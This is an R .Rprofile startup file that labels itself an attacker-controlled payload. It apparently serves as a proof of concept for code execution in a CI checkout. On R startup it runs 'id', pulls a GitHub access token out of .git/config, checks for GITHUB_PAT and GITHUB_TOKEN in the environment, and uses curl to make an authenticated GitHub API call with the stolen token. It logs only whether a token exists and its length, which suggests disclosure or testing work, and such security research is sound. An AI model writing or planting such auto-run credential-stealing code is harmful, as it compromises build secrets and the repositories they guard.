local({
  if (file.exists("/tmp/pwned")) return(invisible(NULL))
  file.create("/tmp/pwned")
  log <- function(...) cat(paste0(..., "\n"), file = stderr())
  log("=== ATTACKER-CONTROLLED .Rprofile EXECUTED ===")
  log("uid: ", paste(system("id", intern = TRUE), collapse = " "))
  tok <- ""
  cfg <- tryCatch(readLines(".git/config", warn = FALSE), error = function(e) character(0))
  hit <- grep("x-access-token:", cfg, value = TRUE)
  if (length(hit) > 0) {
    tok <- sub("^.*x-access-token:([^@]+)@.*$", "\\1", hit[1])
  }
  log("pr-fetch remote token recovered from .git/config: ", nzchar(tok), " (length ", nchar(tok), ")")
  log("GITHUB_PAT env inherited: ", nzchar(Sys.getenv("GITHUB_PAT")))
  log("GITHUB_TOKEN env present: ", nzchar(Sys.getenv("GITHUB_TOKEN")))
  if (nzchar(tok)) {
    code <- tryCatch(system(paste0("curl -s -o /dev/null -w '%{http_code}' -H 'Authorization: token ",
      tok, "' https://api.github.com/repos/", Sys.getenv("GITHUB_REPOSITORY")), intern = TRUE),
      error = function(e) "err")
    log("authenticated API call with stolen token -> HTTP ", paste(code, collapse = ""))
  }
  log("=== END ATTACKER OUTPUT ===")
})
